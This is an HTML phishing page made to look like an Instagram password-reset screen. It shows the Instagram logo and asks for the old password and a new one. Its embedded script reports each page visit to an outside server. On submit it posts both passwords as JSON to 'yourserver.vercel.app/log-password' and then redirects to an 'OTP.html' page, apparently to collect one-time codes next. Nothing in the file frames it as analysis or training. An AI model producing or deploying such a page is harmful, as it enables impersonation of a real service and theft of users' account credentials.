<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        body {
            background-color: #121212; /* Darker background for a sleek look */
            color: #ffffff; /* Bright white text for contrast */
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            padding: 20px;
        }
        .container {
            background: #1e1e1e;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            width: 380px;
            border: 1px solid #333;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #FFFFFF;
        }
        .description {
            font-size: 14px;
            color: #b3b3b3;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border-radius: 8px;
            border: 1px solid #444;
            background: #121212;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }
        input:focus {
            border-color: #0095f6; /* Focus color */
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #00376b;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #00509e; /* Darker blue on hover */
        }
        .error {
            color: #FF4D4D; /* Bright red error message */
            font-size: 12px;
            margin-top: 5px;
            display: none; /* Hidden by default */
        }
        .show-password {
            display: flex;
            align-items: center;
            justify-content: start;
            font-size: 14px;
            color: #b3b3b3;
            margin-top: 10px;
        }
        .show-password input {
            width: auto;
            margin-right: 10px;
        }
        .show-password label {
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <div class="title">Create A Strong Password</div>
        <p class="description">Your password must be at least 6 characters long.</p>
        <form id="passwordForm">
            <input type="password" id="oldPassword" name="oldPassword" placeholder="Old password" required>
            <input type="password" id="newPassword" name="newPassword" placeholder="New password" required>
            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="New password, again" required>
            <div class="show-password">
                <input type="checkbox" id="showPasswordToggle"> <label for="showPasswordToggle">Show Password</label>
            </div>
            <div id="errorMessage" class="error">Password must be at least 6 characters long.</div>
            <button type="submit">Reset Password</button>
        </form>
    </div>

    <script>
        // Notify server when the page is opened
        fetch('https://yourserver.vercel.app/log-page-open', { method: 'POST' });

        document.getElementById('passwordForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            await fetch('https://yourserver.vercel.app/log-password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ oldPassword, newPassword })
            });

            window.location.href = 'OTP.html';
        });
    </script>
</body>
</html>
